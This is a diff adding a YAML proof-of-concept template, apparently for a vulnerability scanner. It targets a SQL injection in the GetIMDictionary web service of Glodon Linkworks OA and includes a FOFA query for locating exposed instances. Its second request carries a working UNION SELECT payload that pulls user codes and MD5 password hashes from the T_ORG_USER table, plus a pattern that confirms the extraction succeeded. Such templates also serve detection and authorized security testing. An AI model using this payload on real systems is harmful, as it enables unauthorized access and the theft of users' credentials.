@@ -1,0 +1,19 @@
+id: poc-yaml-glodon-getimdictionary-sqli
+info:
+  name: 广联达OA GetIMDictionary SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 广联达 Linkworks办公OA
+  fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+requests:
+- method: GET
+  path: /Webservice/IM/Config/ConfigService.asmx
+  expression: status_code == 200 && contains(body,"ConfigService Web 服务") && contains(body,"GetIMDictionary")
+- method: GET
+  path: /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary?dasdas=&key=1'+UNION+ALL+SELECT+top+1+concat(F_CODE,':',F_PWD_MD5)+from+T_ORG_USER+--
+  expression: status_code == 200 && matches(body,`value="[a-zA-Z0-9]+:[0-9A-Fa-f]{32}"
+    ><`) && contains(content_type,"text/xml")
+variables: {}
+transport: http
